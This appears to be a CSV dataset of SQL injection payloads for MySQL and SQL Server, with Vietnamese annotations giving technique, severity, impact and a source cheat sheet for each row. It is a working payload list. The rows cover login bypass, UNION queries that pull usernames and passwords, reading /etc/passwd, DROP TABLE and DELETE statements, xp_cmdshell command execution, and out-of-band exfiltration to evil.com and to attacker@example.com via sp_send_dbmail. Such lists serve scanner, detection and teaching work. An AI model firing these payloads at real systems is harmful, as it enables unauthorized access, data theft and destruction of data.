+' AND (SELECT COUNT(*) FROM users WHERE username LIKE 'a%')>0 -- -,Blind,Boolean-based,MySQL,Cao,Truy cập trái phép,Xác định có username bắt đầu bằng 'a' hay không,HackTricks SQL Injection Guide
+' OR 1=1--,In-band,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Tận dụng điều kiện luôn đúng để truy cập trái phép hoặc kiểm thử tính hợp lệ của câu truy vấn.,Invicti SQL Injection Cheat Sheet
+' AND 1=0--,In-band,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Tận dụng điều kiện luôn đúng để truy cập trái phép hoặc kiểm thử tính hợp lệ của câu truy vấn.,Invicti SQL Injection Cheat Sheet
+1 OR 1=1--,In-band,Boolean-based,MySQL,Trung bình,Truy cập trái phép,Sử dụng biến thể Boolean-based không dùng ký tự đặc biệt để xác thực luôn đúng.,Invicti SQL Injection Cheat Sheet
+' OR 'x'='x--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Điều kiện chuỗi luôn đúng (x = x) để bypass xác thực.,Invicti SQL Injection Cheat Sheet
+' OR 'a'='a--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Điều kiện chuỗi luôn đúng (a = a) dùng để tìm lỗi SQLi.,Invicti SQL Injection Cheat Sheet
+' OR 1=1#,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Sử dụng ký tự '#' để comment kết thúc truy vấn, điều kiện OR 1=1 luôn đúng.",Invicti SQL Injection Cheat Sheet
+' OR 1=1/*,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Sử dụng comment kiểu C (/* */) kết thúc truy vấn với OR 1=1.,Invicti SQL Injection Cheat Sheet
+' OR USER() LIKE 'r%'--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,"So sánh thông tin người dùng, tận dụng lỗ hổng để xác minh điều kiện.",PortSwigger Web Security Academy SQLi Cheatsheet
+"' OR SUBSTRING(USER(),1,1)='r'--",In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Trích xuất kí tự đầu tên đăng nhập qua lệnh điều kiện.,PortSwigger Web Security Academy SQLi Cheatsheet
+"' UNION SELECT 1,2,3--",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Union đơn giản với 3 cột để tìm hiểu số cột của bảng.,HackTricks - Pentesting SQL Injection
+"' UNION SELECT 1, USER(), DATABASE()--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Dùng UNION để trích xuất tên người dùng và tên cơ sở dữ liệu.,HackTricks - Pentesting SQL Injection
+"' UNION SELECT 1,@@version--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union lấy phiên bản máy chủ cơ sở dữ liệu.,HackTricks - Pentesting SQL Injection
+"' AND 1=0 UNION SELECT username,password FROM users--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Bypass chọn dữ liệu từ bảng users bằng UNION sau điều kiện sai.,HackTricks - Pentesting SQL Injection
+"' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union danh sách tên bảng (group_concat) từ information_schema.,HackTricks - Pentesting SQL Injection
+"' UNION SELECT NULL,NULL--",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,"Union thay thế NULL cho mọi cột, dùng thử nhiều cột truy vấn.",HackTricks - Pentesting SQL Injection
+"0' UNION SELECT 1,2--",In-band,UNION-based,MySQL,Trung bình,Truy cập trái phép,Union injection thử nghiệm với 2 cột.,HackTricks - Pentesting SQL Injection
+"0' UNION SELECT DATABASE(),NULL--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union lấy tên database hiện tại.,HackTricks - Pentesting SQL Injection
+' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union dùng LOAD_FILE để đọc file hệ thống (chỉ đọc được file toàn cục).,PentestMonkey MySQL SQLi Cheat Sheet
+"' UNION SELECT 1,current_user()--",In-band,UNION-based,MySQL,Cao,Truy cập trái phép,Union lấy thông tin user hiện tại.,HackTricks - Pentesting SQL Injection
+"' UNION SELECT 1,(SELECT GROUP_CONCAT(name) FROM master.sys.databases)--",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Union liệt kê cơ sở dữ liệu trên SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
+"0' UNION SELECT @@version,NULL--",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Union lấy phiên bản SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
+1' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--,In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Union dùng hàm CHAR ghép ra chuỗi 'user'.,PentestMonkey MySQL SQLi Cheat Sheet
+"' UNION SELECT NAME,1 FROM master..syslogins--",In-band,UNION-based,SQL Server,Cao,Truy cập trái phép,Union lấy tên đăng nhập từ syslogins.,PentestMonkey MySQL SQLi Cheat Sheet
+"' UNION SELECT 1,2,3--",In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Union đơn giản để thử nghiệm nhiều cột trên SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
+"1' UNION SELECT 1,2,3--",In-band,UNION-based,SQL Server,Trung bình,Truy cập trái phép,Union đơn giản để xác định số cột.,PentestMonkey MySQL SQLi Cheat Sheet
+' AND 1=0 HAVING 1=1--,In-band,Error-based,MySQL,Trung bình,Truy cập trái phép,Error-based: ép HAVING gây lỗi để tìm số cột hoặc thông tin.,Invicti SQL Injection Cheat Sheet
+"1 OR 1=CONVERT(int,@@version)--",In-band,Error-based,SQL Server,Trung bình,Truy cập trái phép,Error-based SQLi: ép SQL Server phân tích giá trị gây lỗi hiển thị thông tin.,HackTricks - MSSQL Injection
+1' + USER_NAME(@@VERSION)--,In-band,Error-based,SQL Server,Trung bình,Truy cập trái phép,Error-based SQLi: tận dụng USER_NAME() để gây lỗi và lộ thông tin.,HackTricks - MSSQL Injection
+1; DROP TABLE users--,In-band,Stacked Queries,MySQL,Cao,Xóa dữ liệu,Stacked query: DROP TABLE xóa bảng dữ liệu.,Invicti SQL Injection Cheat Sheet
+1; DELETE FROM orders--,In-band,Stacked Queries,MySQL,Cao,Xóa dữ liệu,Stacked query: DELETE FROM xóa dữ liệu từ bảng.,Invicti SQL Injection Cheat Sheet
+'; UPDATE users SET admin=1--,In-band,Stacked Queries,MySQL,Cao,Sửa đổi dữ liệu,Stacked query: thay đổi quyền user qua UPDATE.,Invicti SQL Injection Cheat Sheet
+'; INSERT INTO users(name) VALUES('test')--,In-band,Stacked Queries,MySQL,Trung bình,Sửa đổi dữ liệu,Stacked query: chèn một bản ghi mới vào users.,Invicti SQL Injection Cheat Sheet
+'; CREATE TABLE hacktest(id int)--,In-band,Stacked Queries,MySQL,Cao,Thực thi lệnh hệ thống,Stacked query: tạo bảng mới trên hệ thống.,Invicti SQL Injection Cheat Sheet
+1; EXEC xp_cmdshell 'whoami'--,In-band,Stacked Queries,SQL Server,Cao,Thực thi lệnh hệ thống,Stacked query trên SQL Server: dùng xp_cmdshell thực thi lệnh OS.,PentestMonkey MySQL SQLi Cheat Sheet
+1; DROP TABLE members--,In-band,Stacked Queries,SQL Server,Cao,Xóa dữ liệu,Stacked query: DROP TABLE xóa bảng members.,PentestMonkey MySQL SQLi Cheat Sheet
+1; UPDATE members SET password='pw'--,In-band,Stacked Queries,SQL Server,Cao,Sửa đổi dữ liệu,Stacked query: thay đổi mật khẩu của user.,PentestMonkey MySQL SQLi Cheat Sheet
+1; INSERT INTO members(login) VALUES('a')--,In-band,Stacked Queries,SQL Server,Trung bình,Sửa đổi dữ liệu,Stacked query: thêm người dùng mới trong bảng members.,PentestMonkey MySQL SQLi Cheat Sheet
+1; DELETE FROM members--,In-band,Stacked Queries,SQL Server,Cao,Xóa dữ liệu,Stacked query: xóa dữ liệu trong bảng members.,PentestMonkey MySQL SQLi Cheat Sheet
+1; CREATE TABLE hack (id int)--,In-band,Stacked Queries,SQL Server,Cao,Thực thi lệnh hệ thống,Stacked query: tạo bảng hack trên SQL Server.,PentestMonkey MySQL SQLi Cheat Sheet
+' OR SLEEP(5)--,Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,Time-based SQLi: SLEEP(5) trì hoãn phản hồi khi điều kiện đúng.,PayloadBox SQL Injection Payload List
+"' OR IF(1=1,SLEEP(5),0)--",Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,"Time-based SQLi: IF điều kiện đúng chạy SLEEP, giúp nhận biết lỗ hổng.",PayloadBox SQL Injection Payload List
+"' OR BENCHMARK(5000000,MD5('a'))--",Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,Time-based SQLi: dùng BENCHMARK tạo độ trễ.,PayloadBox SQL Injection Payload List
+' AND SLEEP(5)--,Blind,Time-based,MySQL,Thấp,Truy cập trái phép,Time-based SQLi: thêm điều kiện SLEEP để tạo chậm trễ.,PayloadBox SQL Injection Payload List
+' OR SLEEP(10)--,Blind,Time-based,MySQL,Trung bình,Truy cập trái phép,Time-based SQLi: SLEEP(10) làm chậm phản hồi.,PayloadBox SQL Injection Payload List
+' OR SLEEP(3)--,Blind,Time-based,MySQL,Thấp,Truy cập trái phép,Time-based SQLi: SLEEP ngắn cho blind injection.,PayloadBox SQL Injection Payload List
+'; WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: WAITFOR DELAY 5 giây.,PayloadBox SQL Injection Payload List
+"""; WAITFOR DELAY '00:00:05'--",Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,"Time-based SQL Server: ký tự "" kết hợp với WAITFOR.",PayloadBox SQL Injection Payload List
+' OR 1=1; WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: OR 1=1 và WAITFOR để kiểm thử.,PayloadBox SQL Injection Payload List
+' OR 1=1; WAITFOR DELAY '00:00:10'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: OR và WAITFOR 10 giây.,PayloadBox SQL Injection Payload List
+' OR 1=1 WAITFOR DELAY '00:00:10'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: OR và WAITFOR 10 giây.,PayloadBox SQL Injection Payload List
+'; WAITFOR DELAY '00:00:10'--,Blind,Time-based,SQL Server,Trung bình,Truy cập trái phép,Time-based SQL Server: ký tự ';' và WAITFOR.,PayloadBox SQL Injection Payload List
+1 AND 1=1--,Blind,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Boolean-based số: 1=1 TRUE, dùng trong blind SQLi.",Invicti SQL Injection Cheat Sheet
+1 AND 1=0--,Blind,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Boolean-based số: 1=0 FALSE, dùng để kiểm thử blind SQLi.",Invicti SQL Injection Cheat Sheet
+1 OR 1=1#,Blind,Boolean-based,SQL Server,Thấp,Truy cập trái phép,Boolean-based với comment #: 1=1 TRUE.,PentestMonkey MSSQL SQLi Cheat Sheet
+1 OR 1=0#,Blind,Boolean-based,SQL Server,Thấp,Truy cập trái phép,Boolean-based với comment #: 1=0 FALSE.,PentestMonkey MSSQL SQLi Cheat Sheet
+1' OR 1=1#,Blind,Boolean-based,SQL Server,Thấp,Truy cập trái phép,"Boolean-based trên SQL Server, bypass luôn đúng.",PentestMonkey MSSQL SQLi Cheat Sheet
+0 OR 0=0--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,"Boolean số: 0=0 TRUE, tránh quote để bypass.",Invicti SQL Injection Cheat Sheet
+0 AND 1=0--,In-band,Boolean-based,MySQL,Thấp,Truy cập trái phép,Boolean số: 1=0 FALSE.,Invicti SQL Injection Cheat Sheet
+1; EXEC master..xp_dirtree '\evil.com\share'--,Out-of-band,Out-of-band,SQL Server,Cao,Truy cập trái phép,Out-of-band: xp_dirtree trên SQL Server kết nối đến máy chủ khác.,PentestMonkey MSSQL SQLi Cheat Sheet
+1; BULK INSERT hack FROM 'C:\\temp\\data.txt'--,Out-of-band,Out-of-band,SQL Server,Cao,Truy cập trái phép,Out-of-band: BULK INSERT lấy dữ liệu từ file share.,PentestMonkey MSSQL SQLi Cheat Sheet
+1; LOAD DATA INFILE 'C:/xampp/htdocs/shell.php' INTO TABLE users--,Out-of-band,Out-of-band,MySQL,Cao,Thực thi lệnh hệ thống,Out-of-band: LOAD DATA tạo file trên server.,HackTricks - Out-of-band Exploitation
+1; SELECT LOAD_FILE('\\evil.com\\share\\file')--,Out-of-band,Out-of-band,MySQL,Cao,Truy cập trái phép,Out-of-band: LOAD_FILE tạo request tới \evil.com\share.,HackTricks - Out-of-band Exploitation
+' OR 1=1; SELECT LOAD_FILE('\\evil.com\\a.txt')--,Out-of-band,Out-of-band,MySQL,Cao,Truy cập trái phép,Out-of-band: kết hợp SQLi và LOAD_FILE exfil dữ liệu qua mạng.,HackTricks - Out-of-band Exploitation
+"' OR 1=1; EXEC msdb.dbo.sp_send_dbmail @profile_name='DBMail',@recipients='attacker@example.com',@query='SELECT * FROM users'--",Out-of-band,Out-of-band,SQL Server,Cao,Truy cập trái phép,Out-of-band: sử dụng sp_send_dbmail gửi dữ liệu qua email.,PentestMonkey MSSQL SQLi Cheat Sheet
+1; SELECT * FROM (SELECT(SLEEP(5)))a--,Blind,Time-based,MySQL,Cao,Truy cập trái phép,Blind time-based: sử dụng SELECT SLEEP để đo độ trễ.,PayloadBox SQL Injection Payload List
+1; WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Blind time-based: WAITFOR DELAY 5s trên SQL Server.,PayloadBox SQL Injection Payload List
+0 WAITFOR DELAY '00:00:05'--,Blind,Time-based,SQL Server,Cao,Truy cập trái phép,Blind time-based: WAITFOR DELAY để đo thời gian phản hồi.,PayloadBox SQL Injection Payload List
